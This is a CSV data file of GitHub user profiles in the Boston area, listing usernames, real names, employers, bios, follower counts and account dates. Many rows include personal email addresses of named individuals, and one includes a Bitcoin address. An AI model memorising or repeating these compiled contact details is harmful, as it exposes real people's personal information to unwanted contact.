+skunkworksneu,NEU AI Skunkworks,NORTHEASTERN UNIVERSITY,Boston,,True,"NEU AI Skunkworks is a group of people who research and develop Artificial Intelligence, Machine Learning, and Deep Learning projects.",11,134,1,2019-02-20T20:19:09Z
+Showndarya,Showndarya,BOSTON UNIVERSITY,"Boston, Massachusetts ",shmadhav@bu.edu,False,CS Graduate at Boston University | Incoming Data Intelligence Developer @ StateStreet,47,134,81,2017-01-15T07:12:48Z
+timmywheels,Tim Wheeler,,"Boston, MA",,True,growth eng + building ai w/ ai,244,134,231,2016-02-14T05:26:50Z
+ballercat,Arthur Buldauskas,PAXOSGLOBAL,"Boston, MA United States",arthurbuldauskas@gmail.com,False,"
+(╯°□°）╯︵ ┻━┻",47,134,2,2011-04-21T14:56:23Z
+Animadversio,Binxu,KEMPNER INSTITUTE AT HARVARD,"Boston, MA",binxu_wang@hms.harvard.edu,True,"Research Fellow @KempnerInstitute  @Harvard, PhD in System Neuro @PonceLab. Generative models, optimization and geometry to understand brain",141,134,132,2017-05-12T21:11:57Z
+Btibert3,Brock Tibert,BOSTON UNIVERSITY,"Boston, MA",,True,IS Faculty. Data and Product Advisor. 100% nerd.,11,133,183,2010-02-14T05:24:36Z
+mbasmanova,Maria Basmanova,,"Boston, MA",,False,,28,133,0,2017-04-24T15:27:39Z
+jfkirk,James Kirk,,"Boston, MA",james.f.kirk@gmail.com,False,"Machine Learning, Recommendations, Personalization. VP ML/AI @ Atlas. Formerly Meru, Spotify, Quantopian, Amazon Robotics.",4,133,3,2014-12-28T00:31:42Z
+amesar,Andre Mesarovic,,Boston,,True,"Big data, MLOps, MLflow, Spark, Docker, Hadoop, NoSQL, SQL, Scala, Python, Java and REST APIs.",43,133,4,2012-05-09T14:10:24Z
+BobGerman,Bob German,MICROSOFT,Boston Area,,False,"Cloud Developer Advocate focused on Microsoft 365 and Azure development, especially building apps for Microsoft Teams using the Graph API. ",60,133,33,2013-06-10T19:06:39Z
+Dewb,Michael Dewberry,,Boston,,False,"
+software architect @Autodesk, he/him ⌌◱◧ art + art-enabling tech ▵▽▵ sculpture, architecture, music, video, theater, electronics—ideally all at once",120,132,38,2011-04-06T06:39:26Z
+eweitz,Eric Weitz,BROAD INSTITUTE,Metro Boston,eric.m.weitz@gmail.com,False,"Genomes, JavaScript, Python",30,132,15,2012-01-16T18:37:00Z
+zenhack,Ian Denhardt,FREELANCER,"Boston, MA, USA",,False,,187,132,5,2011-06-29T11:11:26Z
+mfe7,Michael Everett,NEU-AUTONOMY,"Boston, MA",,False,,20,132,2,2013-02-08T20:31:04Z
+AltraMayor,Michel Machado,DIGIRATI,"Boston, MA",,False,,10,132,0,2011-04-13T13:01:38Z
+robertgshaw2-redhat,Robert Shaw,REDHAT,Boston,,False,The Future of AI is Open,60,132,83,2022-09-26T13:51:33Z
+starburstdata,Starburst,,"Boston, New York, Warsaw",hello@starburstdata.com,False,The Trino Company,75,131,0,2017-10-30T01:38:47Z
+mbta,Massachusetts Bay Transportation Authority ,,"Boston, MA",,False,We're transforming digital infrastructure at the T. ,107,131,0,2016-03-21T21:55:07Z
+alexcjohnson,Alex Johnson,PLOTLY,"Boston, MA USA",alex@plot.ly,False,Founder & Former CTO of @plotly ,14,131,1,2012-10-29T21:40:06Z
+gokriznastic,Gopal Krishna,NORTHEASTERN UNIVERSITY,"Boston, MA",,True,Machine Learning | Computer-Vision | Python,29,130,687,2015-09-07T18:05:03Z
+ariannalillie,Arianna Johnson,ARTHREX,"Boston, MA",,False,Full Stack Software Engineer | JavaScript | Python | React | Express | TypeScript | AWS ,38,130,38,2020-07-16T18:16:20Z
+isaisabel,Isabel Tuson,,"Boston, MA",,False,"Corgi Collector, she/they pronouns.",6,129,8,2017-05-22T15:16:19Z
+fleeting,James Fleeting,MONKEE-BOY,"Boston, MA",hello@jamesfleeting.com,False,Not an astronaut. Former superhero. Current front-end developer. Leading a team at Monkee-Boy,32,129,230,2008-09-03T20:46:43Z
+zlargon,Leon Huang,,"Boston, MA",zlargon1988@gmail.com,True,"Once you stop learning, you start dying.",148,129,149,2012-11-14T01:35:33Z
+ohayon,David Ohayon,APPLE,"Boston, MA",,False,netflix. THE ohio state university buckeye.,6,128,24,2012-10-18T06:48:11Z
+ajaymache,Ajay Mache,,"Boston, MA",,True,,6,128,1,2016-10-04T18:56:48Z
+MarkFontenot,Mark Fontenot,NORTHEASTERN UNIVERSITY,"Boston, MA",,False,Teaching Professor in the Khoury College of Computer Sciences at Northeastern University,50,127,612,2012-05-25T11:09:33Z
+j1z0,Jeremy Johnson,DATAROBOT,Boston,jeremy@realpython.com,True,just a hacker,36,126,10,2011-11-01T15:13:16Z
+amoghbl1,Amogh Pradeep,,"Boston, MA",amoghbl1@gmail.com,True,"""After three days without programming, life becomes meaningless.""",46,125,53,2011-11-05T09:31:32Z
+Mark-Kramer,Mark Kramer,BOSTON UNIVERSITY,"Boston, MA",,False,,33,125,13,2014-09-03T21:00:40Z
+codeforboston,Code for Boston,,"Boston, MA",hello@codeforboston.org,False,Improving civic life and social good in Greater Boston.,121,125,0,2012-10-11T01:56:52Z
+leotrs,Leo Torres,LEOTRS.COM,"Leipzig, Lima, Boston",leo@leotrs.com,False,Postdoc at MPI for Mathematics in the Sciences,57,125,17,2011-10-02T15:33:16Z
+alexischr,Alexis Christoforides,WILDERNESSLABS,"Boston, MA",alexis@thenull.net,False,,19,124,17,2011-09-13T23:26:13Z
+muammar,Muammar El Khatib,,"Greater Boston, Massachusetts ",,False,I am a PhD in Theoretical Physical Chemistry who also likes coding.,89,124,57,2011-08-02T13:55:43Z
+tibbon,David Fisher,AWESOMEFOUNDATION @ACTBLUE,"Boston, Massachusetts",,False,"I like Rust, Ruby, Tensorflow, LED art w/TouchDesigner, motorcycles and modular synths.",207,124,41,2009-05-10T03:49:52Z
+ihnorton,Isaiah Norton,TILEDB-INC,"Boston, MA",,True,,171,124,212,2010-07-09T18:37:41Z
+mdietze,Michael Dietze,BOSTON UNIVERSITY,"Boston, MA",dietze@bu.edu,False,,44,124,30,2012-12-19T14:18:27Z
+scothis,Scott Andrews,,"Boston, MA",scott@andrews.me,False,,158,123,1,2010-06-11T18:25:43Z
+serhatcan,Serhat Can,RESMO,"Boston, US / Ankara, Turkey",,True,"Co-founder and CEO at Resmo @resmoio, AWS Community Hero, DevOpsDays Core organizer",34,123,56,2013-10-04T14:52:15Z
+jyurek,Jon Yurek,DEVELOPER AT @THEGNARCO,"Boston, MA",jyurek@gmail.com,True,,45,123,1,2008-04-03T19:04:54Z
+jwalsh,Jason Walsh,DEFRECORD,"Boston, MA",j@wal.sh,False,Software developer ,161,123,301,2008-11-19T18:09:53Z
+robsimmons,Robert J. Simmons,,"Boston, MA",,False,,84,123,33,2010-10-16T23:28:16Z
+blairmacintyre,Blair MacIntyre,JPMORGAN CHASE,Boston,,False,"Head of AR/VR Research at JPMorgan Chase
+Professor, Art+Design & Computing, Northeastern University
+Bagpipes. Valorant. 
+Husband, Father.",111,123,6,2012-01-18T19:48:54Z
+cji,Craig Ingram,,Boston,,False,"I like kernels, containers, open source, security, and lifting heavy things for time. ",49,123,36,2010-09-28T19:50:28Z
+appsecco,Appsecco ,,"London, Bangalore, Boston",contact@appsecco.com,False,VA/PT | DevSecOps | Cloud Native Security | Kubernetes | Docker | AWS,52,122,0,2016-05-17T07:42:23Z
+colbygk,Colby Gutierrez-Kraybill,"SCRATCH FOUNDATION, MIT","Boston, MA",,False,"Director of Technology/CTO at the Scratch Foundation, spun out of the MIT Media Lab. https://scratch.mit.edu",105,122,26,2010-01-29T17:18:33Z
+cameronraysmith,Cameron Smith,HARVARD MEDICAL SCHOOL,"Boston, MA, USA",,False,,810,122,1589,2010-09-29T15:05:29Z
+nvictus,Nezar Abdennur,,Greater Boston Area,nabdennur@gmail.com,False,,99,122,57,2011-12-18T07:50:10Z
+blurred-machine,Paras Varshney,LOGICAI-IO,"Boston, MA",paras.varshney97@gmail.com,True,"Data Scientist at LogicAI ● Kaggle Master ● Speraker NVIDIA GTC & ODSC West ● Northeastern University, Boston",73,121,46,2017-02-13T18:54:39Z
+webrtcHacks,webrtcHacks,,Boston,admin@webrtchacks.com,False,Technical information and experiments for WebRTC developers,28,121,0,2013-04-18T12:00:39Z
+jkbren,Brennan Klein,NORTHEASTERN UNIVERSITY,"Boston, MA",,False,,24,121,47,2015-11-14T18:14:14Z
+Char2sGu,Charles,NORTHEASTERN UNIVERSITY,Boston,Char2s@outlook.com,False,Independent software developer/designer; 3rd year at Northeastern University,52,120,145,2020-04-11T05:48:48Z
+jvpoulos,Jason Poulos,,"Boston, MA",poulos@berkeley.edu,True,Working on machine learning and causal inference in health and social sciences,38,120,329,2012-09-09T16:27:40Z
+mzgoddard,Z Goddard,,"Boston, MA",ihaloar@gmail.com,False,Fan of interactive animated media web sites and games with that fancy html tech.,148,120,16,2011-06-06T18:02:29Z
+maxton,Max,,Boston,,False,"hacker, code cracker, slacker",37,119,3,2012-07-09T18:54:33Z
+hchasestevens,H. Chase Stevens,,Boston,chase@chasestevens.com,True,"Metaprogramming, natural language processing, and derivative-free optimization technique enthusiast.",70,119,5,2012-01-31T13:55:34Z
+railwaycat,sinxccc,,"Boston, MA",,False,,14,119,15,2010-08-20T08:26:48Z
+oznetmaster,Neil Colvin,NIVLOC ENTERPRISES LTD,"Perth, Australia and Boston, MA",,False,,31,119,0,2013-10-28T22:40:33Z
+DockYard,⚓️ DockYard ⚓️,,"Boston, MA",,False,We build extraordinary user experiences,79,119,0,2011-06-24T18:29:46Z
+katzj,Jeremy Katz,TIDELIFT,"Boston, MA",,False,"Hacker, entrepreneur, and tech leader.
+---
+Cofounder/CTO @tidelift making open source better for all. Let's pay the maintainers!",43,119,0,2009-10-19T13:44:31Z
+faisalml,Faisal Mahmood,HARVARD MEDICAL SCHOOL,"Boston, MA",,False,Mahmood Lab @ Brigham and Women's Hospital | Dana-Farber Cancer Institute | Harvard Medical School,9,118,6,2018-05-18T21:55:46Z
+walaj,Jeremiah Wala,DFCI,"Boston, MA",,False,Oncology Fellow | Dana Farber Cancer Institute / Mass General Brigham,37,118,52,2014-03-11T18:34:26Z
+rohitgandikota,Rohit Gandikota,NORTHEASTERN UNIVERSITY,Boston,,False,"Ph.D. AI @ Northeastern University. Understanding, mapping, and editing knowledge in large generative models. Ex-Scientist Indian Space Research Organization",38,118,1,2016-02-29T05:59:59Z
+nicolebranagan,Nicole Caroline Branagan,,"Boston, MA",,False,,22,118,0,2015-07-09T21:03:45Z
+Kirpal,Kirpal Demian,VGVENTURES,Boston,demian@kirp.al,False,Flutter developer,44,117,66,2016-04-10T20:56:15Z
+pletcher,Charles Pletcher,,Boston,,False,,52,117,9,2012-07-20T23:57:56Z
+HamedAlemo,Hamed Alemohammad,CLARK UNIVERSITY,"Boston, MA",,False,"Director, Center for Geospatial Analytics
+Associate Prof., Graduate School of Geography;
+Clark University",16,116,8,2014-01-31T15:46:15Z
+cskonopka,Christopher Konopka,VONDAS-NETWORK,"Boston, MA",cskonopka@protonmail.com,True,"I wouldn't understand, I'm not an engineer. 
+
+BTC: bc1qwhyylc88a4k2ellxk9ptewcgjs4c74wz5fk8ut",106,116,162,2014-05-19T04:14:27Z
+jlev,Josh Levinger,SPACEDOGXYZ,"Boston, MA",josh@levinger.net,False,"Founding Engineer @elephantenergy-us.  Previously @impactobservatory, @OpenSourceActivismTech, @spacedogXYZ. Coached @truckeerobotics. Alumnus @mit @mitmedialab",48,116,175,2010-06-02T23:58:21Z
+misteroneill,Pat O'Neill,,"Boston, MA",,False,,47,116,31,2010-03-03T15:41:36Z
+lmweber,Lukas Weber,BOSTON UNIVERSITY,"Boston, MA",lmweber@bu.edu,False,"Assistant Professor, Department of Biostatistics, Boston University",92,115,14,2014-07-03T21:24:09Z
+asmae-toumi,,,"Boston, MA",,False,,24,115,1,2019-09-12T11:57:14Z
+trevor-e,Trevor Elkins,,"Boston, MA",,False,"Currently building mobile dev tools at @EmergeTools, and formerly at Stripe + KAYAK.",17,114,103,2012-02-17T20:57:13Z
+ahmetcankaraoglan,Ahmet Can Karaoglan,,Boston,krglnahmetcan@gmail.com,False,"
+Data Scientist, Deep Learning Enthusiast
+",20,114,71,2019-10-20T22:00:35Z
+jeffcampbellmakesgames,Jeff Campbell,ZAPDOT,"Boston, MA",,False,Technical Director @zapdot. I make open source tools for game developers.,26,114,86,2012-04-20T17:40:41Z
+dimzzy,Dmitry Stadnik,,"Boston, MA",d@stdnk.com,False,,24,112,15,2010-04-16T10:55:07Z
+MarieReRe,Marie,DATADOG,Boston,,True,Sales Engineer at Datadog ,129,112,99,2019-07-05T13:58:26Z
+cmkoller,Christina Koller,,"Boston, MA",cmkoller02@gmail.com,False,,52,112,30,2014-09-05T15:44:07Z
+henchc,Christopher Hench,,"Boston, MA",,True,"UC Berkeley PhD, Berkeley Institute for Data Science Fellow, D-Lab Fellow",51,112,145,2015-09-01T16:19:20Z
+sjkelly,Steve Kelly,,Boston,,False,At the bits->atoms boundary,279,111,1,2012-08-02T23:15:25Z
+menacher,Abraham Menacherry,AKAMAI,"Boston, MA",abrahammenacherry@gmail.com,False,,5,111,30,2011-09-06T14:11:33Z
+dmmiller612,Derek Miller,DEEPCURE,"Boston, Massachusetts",dmmiller612@gmail.com,True,,21,111,2,2013-10-02T21:02:22Z
+TasoOneAsia,Michael,"F5, INC. / NGINX","Boston, MA",,False,"I do coding things | @f5 @nginxinc 
+",65,111,42,2015-11-04T13:25:49Z
+jonmatthis,,,Boston MA USA,,False,,234,111,17,2015-10-25T21:06:46Z
+stchang,Stephen Chang,PLT @ UMASS BOSTON,"Boston, MA",stephen.chang@umb.edu,False,,111,111,26,2008-10-12T19:39:16Z
+lacava,William La Cava,CAVALAB,"Boston, MA",,True,Assistant Prof at Harvard Medical School developing ML for applications in biomedical informatics. I run the @cavalab at Boston Children's Hospital,60,111,33,2014-02-03T20:12:54Z
+jeffwhelpley,Jeff Whelpley,GETHUMAN,"Boston, MA",,False,,44,110,2,2012-06-20T00:09:16Z
+huy-nguyen,Huy Nguyen,NIAID,"Boston, MA",me@huy.dev,False,"Software Engineer @niaid. Previously @broadinstitute, @cid-harvard and @periscopic.",51,110,0,2014-04-20T10:13:50Z
+wil3,Wil Koch,MERLIN LABS,Boston,,True,"senior flight controls software engineer
+
+",78,110,10,2013-06-01T14:16:45Z
+dancrossnyc,Dan Cross,OXIDE COMPUTER COMPANY,"New York City, Boston, Bombay",,False,Systems. Radio. Math. he/him,53,109,14,2012-03-30T23:52:27Z
+dougqh,Douglas Q Hawkins,,Boston MA,dougqh@gmail.com,False,,12,109,0,2010-06-21T17:32:15Z
+trflynn89,Tim Flynn,VIASAT,"Boston, MA",,False,,32,109,0,2013-10-03T04:10:21Z
+oxfemale,lulz,LULZ,"USA, Boston",,False,Come get some,220,109,24,2014-12-05T09:07:50Z
+r3k2,CF_ReK2,"CYBERSECURITY, HACKER, PENTESTER, DEVSECOPS","Barcelona, Madrid , San Francisco, Boston CyberSpace",,False,"Please respect hacker ethics - and move away from github, consider gitlab, sourcehut and other libre options. My repos are on gitlab and sourcehut",15,109,67,2013-08-26T22:33:44Z
+xandkar,Siraaj Khandkar,,Greater Boston,siraaj@khandkar.net,True,λ🐫🦀,155,109,109,2011-06-13T13:22:15Z
+michaelballantyne,Michael Ballantyne,NUPRL,"Boston, Massachusetts",michael.ballantyne@gmail.com,False,,120,108,3,2012-02-11T18:00:46Z
+femtomc,McCoy R. Becker,PROBCOMP,"Boston, MA",,False,Bayesian brain-in-a-jar.,130,108,63,2017-12-10T04:40:44Z
+dragonstyle,Charles Teague,,"Boston, MA",cteague@gmail.com,False,,66,108,15,2010-05-02T02:11:36Z
+acconrad,Adam Conrad,FACEBOOK,"Boston, MA",,False,"Engineering Manager @Facebook 🚜
+  Advisor for Fisherman 🥡 Speaker / Host for Software Engineering Radio 🎙️
+Writer for Software Daily ✏️",53,108,7,2010-09-30T12:59:07Z
+gdbelvin,Gary Belvin,GDB SECURITY,Boston,,False,"Head of Information Security at HRT
+Key Transparency Founder,
+E2E Encryption Protocols, Cyber Policy, NGO Security Consultant",44,108,29,2010-02-06T17:12:23Z
+jsteiner,Josh Steiner,"THOUGHTBOT, INC.","Boston, MA",josh@jsteiner.me,False,,70,108,0,2010-11-03T22:17:08Z
+sempervictus,RageLtMan,SEMPERVICTUS,Boston MA,,True,,175,108,6,2012-01-15T04:26:40Z
+Upstatement,Upstatement,,"Boston, MA",info@upstatement.com,False,,68,108,0,2011-02-03T17:46:06Z
+dbp,Daniel Patterson,NORTHEASTERN UNIVERSITY,"Boston, MA",dbp@dbpmail.net,False,"teaching faculty at Northeastern University. formerly PhD student @nuprl, member/owner at @positiondev.",145,107,0,2011-01-17T20:29:18Z
+H-Freax,Freax Ruby,NORTHEASTERN UNIVERSITY,Boston,limyoonaxi@gmail.com,False," 🔬 RA @ Helping Hands Lab @ Information Experience and Accessibility Lab | Researcher @PathOnAI | 🎓 IS @ NEU | Ex MLE Co-op @Lendbuzz @CHATS Lab
+🐱🐶🐯🦁🦋",28,107,308,2018-01-25T09:17:11Z
+spember,Steve Pember,,Boston,spember@gmail.com,False,,35,107,0,2010-05-21T20:09:09Z
+bmac,Brendan McLoughlin,,Boston MA,,False,,180,107,20,2009-02-12T20:42:44Z
+nobodywasishere,Margret Riegert,KAGISEARCH,"Boston, MA",margret@eowyn.net,False,Developer @kagisearch  & CrystalDoc.info,104,107,386,2017-10-14T14:49:05Z
+tremblerz,Abhishek Singh,MIT,"Boston, USA",abhi24@mit.edu,False,,63,106,0,2015-01-16T05:15:13Z
+Caner-Yesiltas,Caner Yesiltas,,Boston/MA,,False,"Front-End Developer  | 
+React, Next.js & TypeScript ⚛️",64,106,62,2024-03-07T02:22:35Z
+sravanareddy,Sravana Reddy,SPOTIFY,"Boston, MA",sravana.reddy@gmail.com,True,,10,106,0,2011-11-22T07:31:28Z
+jdricklefs,John Ricklefs,,"Boston, MA",,False,,2,106,6,2011-09-12T19:59:14Z
+donald-pinckney,Donald Pinckney,NORTHEASTERN UNIVERSITY,"Boston, MA",,False,Currently I am a PhD student in computer science at Northeastern University.,71,105,6,2013-06-20T19:19:50Z
+rootiest,Christopher Laprade,ROOTIEST SOLUTIONS,"Boston, MA, USA",chris@rootiest.com,False,"Software developer and maker.
+Neovim editor.
+Klipper 3d printer firmware.
+Arch, btw.",49,105,2,2018-04-03T19:15:05Z
+kbressem,Keno,AIM HARVARD-MGB,Boston,,False,Radiologist interested in deep learning,27,105,31,2018-03-10T22:28:10Z
+ken-matsui,Ken Matsui,MEDIATEK,"Boston, MA",,True,"Compiler/Toolchain Engineer at MediaTek. Creator of @cabinpkg, a package manager and build system for C++.
+",133,105,0,2017-03-14T09:44:32Z
+thkruz,Theodore Kruczek,,"Boston, MA",theodore.kruczek@gmail.com,False,🔭🛰️Constantly working on something related to satellite operations.  I enjoy making space concepts accessible to everyone through JavaScript and TypeScript.,21,105,114,2016-11-07T17:40:58Z
+JamesHujy,,MIT,Boston,,False,"Multimodal Learning and NLP | Visiting PhD in MIT |
+PhD in THUNLP",19,104,37,2019-03-10T09:56:32Z
+jwmi,Jeff Miller,HARVARD SCHOOL OF PUBLIC HEALTH,"Boston, MA",,False,Assistant Professor of Biostatistics,9,104,0,2014-07-02T15:48:29Z
+darkerego,Darkerego,SELFEMPLOYED,"Boston MA, USA",,True,Linux admin and opsec cli tool master turned into the ghost in your smart contract available for hire.,157,103,103,2014-08-28T19:52:06Z
+BenBrostoff,Ben Brostoff,MEDLEY RELAY CONSULTING,"Boston, MA",ben.brostoff@gmail.com,False,"@klaviyo, Free Blocks, DraftFast, Medley Relay.
+
+Available for contracting (web, mobile and more).",93,103,156,2014-03-18T20:07:16Z
+muigaiunaka,muigai,AUDIBLE,"Boston, MA",muigaiunaka@gmail.com,True,Amazon SDE on the Audible Voice Experience team,35,103,66,2014-10-09T03:17:52Z
+mayank31398,Mayank Mishra,MIT-IBM WATSON AI LAB,Boston,,False,Interested in Efficient Models,46,103,56,2017-10-20T09:00:50Z
+rajarshi,Rajarshi Guha,,"Boston, MA",rajarshi.guha@gmail.com,False,,51,102,3,2008-11-14T03:34:56Z
+kjellr,Kjell Reigstad,SHOPIFY,"Boston, MA",,False,Design @Shopify / Previously @Automattic @WordPress etc.,16,102,4,2011-11-17T19:21:18Z
+FlipsideCrypto,Flipside Crypto,,"Boston, MA",,False,,108,102,0,2017-10-12T22:03:08Z
+avaidyam,Aditya Vaidyam,BIDMCDIGITALPSYCHIATRY,"Boston, MA",,False,"Medical Student (M2) @ Carle Illinois College of Medicine,
+Assistant Director of Clinical Systems @ Division of Digital Psychiatry at BIDMC/Harvard",34,101,13,2012-01-20T23:12:11Z
+nonprofittechy,Quinten Steenhuis,SUFFOLK UNIVERSITY LAW SCHOOL,"Boston, MA",qsteenhuis@suffolk.edu,True,"Lawyer, professor and technologist for social change @suffolklitlab. Using #legaltech for #a2j. Founder @LemmaLegalConsulting",63,101,23,2014-05-20T14:21:34Z
+sbose78,Shoubhik Bose,RED HAT INC.,Boston,shbose@redhat.com,True,"Engineering architect at Red Hat.
+
+",298,101,8,2011-01-03T11:42:05Z
+pinellolab,Pinello Lab,,Boston,lpinello@mgh.harvard.edu,False,Massachusetts General Hospital/Harvard Medical School,57,100,0,2017-07-21T11:23:35Z
+delton137,Dan Elton,MASS GENERAL HOSPITAL,"Boston, Massachusetts ",,True,https://www.moreisdifferent.com,35,100,48,2014-04-16T20:38:35Z
